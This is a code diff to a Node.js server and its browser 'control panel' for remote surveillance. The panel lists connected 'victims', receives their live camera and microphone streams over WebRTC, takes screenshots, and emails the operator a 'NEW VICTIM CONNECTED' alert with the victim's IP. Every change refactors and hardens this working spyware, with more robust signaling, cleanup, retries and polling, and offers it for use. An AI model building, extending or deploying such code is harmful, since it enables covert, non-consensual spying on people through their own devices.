@@ -191,10 +191,119 @@ app.get('/control', (req, res) => {
 
     const peerConnections = {};
     const remoteStreams = {};
+    const sessionListeners = {}; // track listeners per session to remove them
 
     socket.on('connect', function() {
       addLog('✅ Connected to signaling server');
     });
+
+    function cleanupSession(sid) {
+      // Close peer connection
+      if (peerConnections[sid]) {
+        try { peerConnections[sid].close(); } catch(e) {}
+        delete peerConnections[sid];
+      }
+      delete remoteStreams[sid];
+      // Remove socket listeners for this session
+      if (sessionListeners[sid]) {
+        sessionListeners[sid].forEach(function(item) {
+          socket.off(item.event, item.fn);
+        });
+        delete sessionListeners[sid];
+      }
+    }
+
+    function connectToSession(sid, card, v) {
+      // Clean up any existing connection first
+      cleanupSession(sid);
+
+      const iceConfig = { 
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'stun:stun2.l.google.com:19302' },
+          { urls: 'stun:global.stun.twilio.com:3478' }
+        ]
+      };
+
+      const pc = new RTCPeerConnection(iceConfig);
+      peerConnections[sid] = pc;
+      sessionListeners[sid] = [];
+
+      let hasRemoteDesc = false;
+      let iceQueue = [];
+
+      pc.ontrack = function(event) {
+        if (event.streams && event.streams[0]) {
+          v.srcObject = event.streams[0];
+          remoteStreams[sid] = event.streams[0];
+        } else {
+          if (!v.srcObject) {
+            v.srcObject = new MediaStream();
+          }
+          v.srcObject.addTrack(event.track);
+          remoteStreams[sid] = v.srcObject;
+        }
+        addLog('📡 Track (' + event.track.kind + ') from ' + sid);
+      };
+
+      pc.onicecandidate = function(event) {
+        if (event.candidate) {
+          socket.emit('ctrl-ice', { target: sid, candidate: event.candidate });
+        }
+      };
+
+      pc.oniceconnectionstatechange = function() {
+        addLog('⚡ ICE ' + sid + ': ' + pc.iceConnectionState);
+        if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
+          addLog('🟢 LIVE! Stream active from ' + sid);
+          var dot = card.querySelector('.status-dot');
+          if (dot) { dot.className = 'status-dot online'; }
+        }
+        if (pc.iceConnectionState === 'failed') {
+          addLog('🔴 ICE failed for ' + sid + ' - retrying...');
+          setTimeout(function() { connectToSession(sid, card, v); }, 2000);
+        }
+      };
+
+      // Register offer listener
+      var offerFn = function(offer) {
+        addLog('📥 Offer from ' + sid);
+        pc.setRemoteDescription(new RTCSessionDescription(offer))
+          .then(function() {
+            hasRemoteDesc = true;
+            // Flush queued ICE candidates
+            iceQueue.forEach(function(c) {
+              pc.addIceCandidate(new RTCIceCandidate(c)).catch(function(e) { addLog('❌ ICE: ' + e.message); });
+            });
+            iceQueue = [];
+            return pc.createAnswer();
+          })
+          .then(function(answer) { return pc.setLocalDescription(answer); })
+          .then(function() {
+            socket.emit('ctrl-answer', { target: sid, answer: pc.localDescription });
+            addLog('📤 Answer sent to ' + sid);
+          })
+          .catch(function(e) { addLog('❌ Error: ' + e.message); });
+      };
+      socket.on('victim-offer-' + sid, offerFn);
+      sessionListeners[sid].push({ event: 'victim-offer-' + sid, fn: offerFn });
+
+      // Register ICE candidate listener
+      var iceFn = function(candidate) {
+        if (hasRemoteDesc) {
+          pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(function(e) { addLog('❌ ICE: ' + e.message); });
+        } else {
+          iceQueue.push(candidate);
+        }
+      };
+      socket.on('victim-ice-' + sid, iceFn);
+      sessionListeners[sid].push({ event: 'victim-ice-' + sid, fn: iceFn });
+
+      // Request stream
+      socket.emit('request-stream', { target: sid });
+      addLog('📨 Requested stream from ' + sid);
+    }
 
     socket.on('session-list', function(sessions) {
       sessionCount.textContent = sessions.length;
@@ -203,33 +312,30 @@ app.get('/control', (req, res) => {
         sessionList.innerHTML = '<div class="no-sessions" id="noSessionsMsg">🔴 Waiting for victims to connect...</div>';
         return;
       } else if (sessions.length > 0) {
-        const noSess = document.getElementById('noSessionsMsg');
+        var noSess = document.getElementById('noSessionsMsg');
         if (noSess) noSess.remove();
       }
 
-      // Remove cards that are no longer in the active sessions list
-      Array.from(sessionList.children).forEach(child => {
+      // Remove cards for disconnected sessions
+      Array.from(sessionList.children).forEach(function(child) {
         if (child.id && child.id.startsWith('card-')) {
-          const sid = child.id.replace('card-', '');
+          var sid = child.id.replace('card-', '');
           if (!sessions.includes(sid)) {
             child.remove();
-            if (peerConnections[sid]) {
-              peerConnections[sid].close();
-              delete peerConnections[sid];
-              delete remoteStreams[sid];
-            }
+            cleanupSession(sid);
           }
         }
       });
 
-      sessions.forEach(sid => {
+      // Add new sessions (skip existing)
+      sessions.forEach(function(sid) {
         if (document.getElementById('card-' + sid)) return;
 
-        const card = document.createElement('div');
+        var card = document.createElement('div');
         card.className = 'session-card';
         card.id = 'card-' + sid;
 
-        const v = document.createElement('video');
+        var v = document.createElement('video');
         v.id = 'video-' + sid;
         v.autoplay = true;
         v.playsinline = true;
@@ -237,14 +343,14 @@ app.get('/control', (req, res) => {
         v.style.borderRadius = '10px';
         v.muted = true;
 
-        const info = document.createElement('div');
+        var info = document.createElement('div');
         info.className = 'info';
         info.innerHTML = '<span class="status-dot online"></span> Session: <strong>' + sid + '</strong>';
 
-        const controlsDiv = document.createElement('div');
+        var controlsDiv = document.createElement('div');
         controlsDiv.className = 'controls';
         
-        const btnAudio = document.createElement('button');
+        var btnAudio = document.createElement('button');
         btnAudio.className = 'btn-audio';
         btnAudio.textContent = '🔊 Unmute Audio';
         btnAudio.onclick = function() {
@@ -252,16 +358,16 @@ app.get('/control', (req, res) => {
           btnAudio.textContent = v.muted ? '🔊 Unmute Audio' : '🔇 Mute Audio';
         };
 
-        const btnSnap = document.createElement('button');
+        var btnSnap = document.createElement('button');
         btnSnap.className = 'btn-snap';
         btnSnap.textContent = '📸 Screenshot';
         btnSnap.onclick = function() {
-          const canvas = document.createElement('canvas');
-          canvas.width = v.videoWidth;
-          canvas.height = v.videoHeight;
+          var canvas = document.createElement('canvas');
+          canvas.width = v.videoWidth || 640;
+          canvas.height = v.videoHeight || 480;
           canvas.getContext('2d').drawImage(v, 0, 0);
-          const link = document.createElement('a');
-          link.download = 'snapshot_' + sid + '_' + Date.now() + '.png';
+          var link = document.createElement('a');
+          link.download = 'snap_' + sid + '_' + Date.now() + '.png';
           link.href = canvas.toDataURL();
           link.click();
         };
@@ -274,93 +380,25 @@ app.get('/control', (req, res) => {
         card.appendChild(controlsDiv);
         sessionList.appendChild(card);
 
-        // إنشاء Peer Connection للتحكم
-        const pc = new RTCPeerConnection({ 
-          iceServers: [
-            { urls: 'stun:stun.l.google.com:19302' },
-            { urls: 'stun:stun1.l.google.com:19302' },
-            { urls: 'stun:stun2.l.google.com:19302' },
-            { urls: 'stun:global.stun.twilio.com:3478' }
-          ] 
-        });
-        peerConnections[sid] = pc;
-
-        pc.ontrack = function(event) {
-          if (event.streams && event.streams[0]) {
-            v.srcObject = event.streams[0];
-            remoteStreams[sid] = event.streams[0];
-          } else {
-            v.srcObject = new MediaStream([event.track]);
-            remoteStreams[sid] = v.srcObject;
-          }
-          addLog('📡 Track received (' + event.track.kind + ') from ' + sid);
-        };
-
-        pc.onicecandidate = function(event) {
-          if (event.candidate) {
-            socket.emit('ice-candidate', { target: sid, candidate: event.candidate });
-          }
-        };
-
-        pc.oniceconnectionstatechange = function() {
-          addLog('⚡ ICE State ' + sid + ': ' + pc.iceConnectionState);
-          if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
-            addLog('🔴 Session ' + sid + ' disconnected');
-            if (card.parentNode) card.remove();
-            delete peerConnections[sid];
-            delete remoteStreams[sid];
-          }
-        };
-
-        // طلب البث من الضحية
-        socket.emit('request-stream', { target: sid });
-
-        let hasRemoteDesc = false;
-        let iceQueue = [];
-
-        socket.on('video-offer-' + sid, function(offer) {
-          addLog('📥 Video Offer received from ' + sid);
-          pc.setRemoteDescription(new RTCSessionDescription(offer))
-            .then(() => {
-              hasRemoteDesc = true;
-              iceQueue.forEach(c => pc.addIceCandidate(new RTCIceCandidate(c)).catch(e => addLog('❌ ICE Error: ' + e.message)));
-              iceQueue = [];
-            })
-            .then(() => pc.createAnswer())
-            .then(answer => pc.setLocalDescription(answer))
-            .then(() => {
-              socket.emit('video-answer', { target: sid, answer: pc.localDescription });
-              addLog('📤 Video Answer sent to ' + sid);
-            })
-            .catch(e => addLog('❌ Offer processing error: ' + e.message));
-        });
-
-        socket.on('ice-candidate-' + sid, function(candidate) {
-          if (hasRemoteDesc) {
-            pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => addLog('❌ ICE Error: ' + e.message));
-          } else {
-            iceQueue.push(candidate);
-          }
-        });
+        // Connect WebRTC
+        connectToSession(sid, card, v);
       });
     });
 
     socket.on('new-session', function(sid) {
-      addLog('🆕 New victim connected: ' + sid);
-      // تحديث القائمة
+      addLog('🆕 New victim: ' + sid);
       socket.emit('get-sessions');
     });
 
     socket.on('session-gone', function(sid) {
       addLog('🔴 Session ended: ' + sid);
-      const card = document.getElementById('card-' + sid);
+      var card = document.getElementById('card-' + sid);
       if (card && card.parentNode) card.remove();
-      delete peerConnections[sid];
-      delete remoteStreams[sid];
+      cleanupSession(sid);
     });
 
-    // طلب القائمة كل 5 ثواني
-    setInterval(() => socket.emit('get-sessions'), 5000);
+    // Poll sessions every 10 seconds (not 5)
+    setInterval(function() { socket.emit('get-sessions'); }, 10000);
     socket.emit('get-sessions');
   </script>
 </body>
@@ -375,20 +413,20 @@ io.on('connection', (socket) => {
 
   console.log(`[+] New connection: ${sessionId} from ${clientIP}`);
 
-  // هل هذا متصل من Control Panel؟
+  // Control Panel requests active sessions list
   socket.on('get-sessions', () => {
-    // المستعلم هو Control Panel
     socket.isControl = true;
     const activeList = Array.from(activeSessions.keys());
     socket.emit('session-list', activeList);
   });
 
-  // Victim يرسل offer
+  // Victim registers itself
   socket.on('offer', (offer) => {
     socket.sessionId = sessionId;
+    socket.isVictim = true;
     activeSessions.set(sessionId, { socket, ip: clientIP, connectedAt: Date.now() });
 
-    // إرسال إيميل
+    // Send email alert
     const mailBody = `
 🚨 NEW VICTIM CONNECTED 🚨
 
@@ -411,44 +449,51 @@ Open Control Panel: http://localhost:${PORT}/control
       console.log(`[EMAIL] Failed to send: ${err.message}`);
     });
 
-    // إعلام Control Panels
+    // Notify all Control Panels
     io.emit('new-session', sessionId);
-
-    // حفظ offer للـ control panels
-    socket.offer = offer;
-    console.log(`[SIGNAL] Offer received from ${sessionId}`);
+    console.log(`[SIGNAL] Victim registered: ${sessionId}`);
   });
 
-  // Control Panel requests stream
+  // CP requests stream from a victim
   socket.on('request-stream', (data) => {
     const victim = activeSessions.get(data.target);
     if (victim) {
+      console.log(`[SIGNAL] CP ${socket.id} requesting stream from ${data.target}`);
       victim.socket.emit('request-stream', { cpId: socket.id });
+    } else {
+      console.log(`[SIGNAL] Victim ${data.target} not found for stream request`);
     }
   });
 
-  // Victim sends offer to CP
+  // Victim sends WebRTC offer (to be relayed to CP)
   socket.on('video-offer', (data) => {
-    socket.to(data.cpId).emit('video-offer-' + socket.sessionId, data.offer);
+    console.log(`[SIGNAL] Victim ${socket.sessionId} sends offer to CP ${data.cpId}`);
+    io.to(data.cpId).emit('victim-offer-' + socket.sessionId, data.offer);
   });
 
-  // CP sends answer to Victim
-  socket.on('video-answer', (data) => {
+  // CP sends WebRTC answer (to be relayed to Victim)
+  socket.on('ctrl-answer', (data) => {
     const victim = activeSessions.get(data.target);
     if (victim) {
+      console.log(`[SIGNAL] CP ${socket.id} sends answer to victim ${data.target}`);
       victim.socket.emit('video-answer', { cpId: socket.id, answer: data.answer });
     }
   });
 
-  // ICE candidates
+  // ICE from Victim → CP
   socket.on('ice-candidate', (data) => {
+    if (data.cpId && socket.sessionId) {
+      io.to(data.cpId).emit('victim-ice-' + socket.sessionId, data.candidate);
+    }
+  });
+
+  // ICE from CP → Victim
+  socket.on('ctrl-ice', (data) => {
     if (data.target) {
-      // From CP to Victim
       const victim = activeSessions.get(data.target);
-      if (victim) victim.socket.emit('ice-candidate', { cpId: socket.id, candidate: data.candidate });
-    } else if (data.cpId) {
-      // From Victim to CP
-      socket.to(data.cpId).emit('ice-candidate-' + socket.sessionId, data.candidate);
+      if (victim) {
+        victim.socket.emit('ice-candidate', { cpId: socket.id, candidate: data.candidate });
+      }
     }
   });
 
